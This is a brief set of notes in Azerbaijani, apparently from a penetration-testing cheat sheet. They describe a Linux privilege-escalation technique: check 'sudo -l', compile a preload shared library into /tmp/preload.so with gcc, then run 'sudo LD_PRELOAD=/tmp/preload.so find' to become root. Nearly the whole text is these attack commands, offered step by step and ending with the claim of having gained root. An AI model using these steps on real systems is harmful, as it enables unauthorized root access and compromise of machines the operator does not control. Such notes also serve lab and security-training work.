## eger kernelin bu versiyasidirsa 
## daha sonra biz (sudo -l) emrini icra edirik
## misal ucun find emrini root kimi icazemiz varsa 
    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
## ardiyca asaqdaki kommandi veririk    
    sudo LD_PRELOAD=/tmp/preload.so find
## artiq biz Root olduq
